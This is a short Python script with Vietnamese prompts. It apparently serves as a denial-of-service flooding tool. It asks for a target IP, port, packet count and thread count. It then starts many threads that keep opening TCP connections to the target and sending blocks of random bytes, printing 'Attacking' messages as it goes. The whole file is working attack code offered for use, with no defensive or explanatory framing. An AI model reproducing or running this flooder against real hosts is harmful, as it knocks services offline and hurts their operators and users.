import random 
import threading
import socket
import os
import time
from termcolor import colored

os.system('cls')

ip = str(input(colored('Nhap ip :','green')))
port = int(input(colored('nhap port...: ','green')))
packet = int(input(colored('Nhap Packets...:','green')))
thread = int(input(colored('Nhap thread...','green')))
def Sys():
    hevin = random._urandom(900)
    bb    = int(0)
    while True:
        try:
            h = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(hevin)
            for i in range(packet):
                h.send(hevin)
            bb+=1
            print(colored(' Attacking ... '+ip+'>>>Sent :' +str(bb),'red'))

        except KeyboardInterrupt:
            h.close()
            print(colored('Done !!!!!','green'))
            pass

for b in range(thread) :
    thread = threading.Thread(target=Sys)
    thread.start()